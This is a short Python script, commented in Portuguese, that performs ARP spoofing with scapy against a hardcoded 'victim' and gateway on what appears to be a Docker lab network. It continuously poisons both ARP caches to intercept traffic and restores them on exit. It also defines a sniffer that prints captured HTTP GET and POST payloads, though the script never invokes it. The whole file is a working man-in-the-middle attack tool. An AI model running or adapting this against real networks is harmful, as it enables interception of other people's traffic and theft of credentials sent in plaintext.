#!/usr/bin/env python3
# spoofing.py - ARP Spoofing simples em Python

from scapy.all import *
import time
import sys
import threading

def get_mac(ip):
    """Obtém MAC de um IP"""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, target_mac, spoof_ip):
    """Envia pacote ARP falsificado"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, target_mac, source_ip, source_mac):
    """Restaura tabela ARP"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def packet_callback(packet):
    """Callback chamada para cada pacote capturado"""
    if packet.haslayer(Raw) and packet.haslayer(IP):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        if "GET" in payload or "POST" in payload:
            print("\n" + "=" * 60)
            print("[!] REQUISIÇÃO HTTP CAPTURADA!")
            print("=" * 60)
            print(payload[:500])  # Mostra os primeiros 500 caracteres
            print("=" * 60 + "\n")

def start_sniffer():
    """Inicia o sniffer em uma thread separada"""
    print("[*] Iniciando sniffer HTTP (porta 80)...")
    sniff(filter="host 10.10.0.101 and port 80", prn=packet_callback, store=False)

if __name__ == "__main__":
    # IPs no laboratório
    GATEWAY_IP = "10.10.0.1"  # Gateway da rede Docker
    VICTIM_IP = "10.10.0.101"  # victim1

    print(f"[*] Atacando {VICTIM_IP} fingindo ser {GATEWAY_IP}")

    try:
        victim_mac = get_mac(VICTIM_IP)
        gateway_mac = get_mac(GATEWAY_IP)

        if not victim_mac or not gateway_mac:
            print("[!] Não foi possível obter MACs")
            sys.exit(1)

        print(f"[+] MAC da vítima: {victim_mac}")
        print(f"[+] MAC do gateway: {gateway_mac}")

        while True:
            # Engana a vítima: "eu sou o gateway"
            spoof(VICTIM_IP, victim_mac, GATEWAY_IP)
            # Engana o gateway: "eu sou a vítima"
            spoof(GATEWAY_IP, gateway_mac, VICTIM_IP)
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Restaurando...")
        restore(VICTIM_IP, victim_mac, GATEWAY_IP, gateway_mac)
        restore(GATEWAY_IP, gateway_mac, VICTIM_IP, victim_mac)
        print("[+] Restaurado")
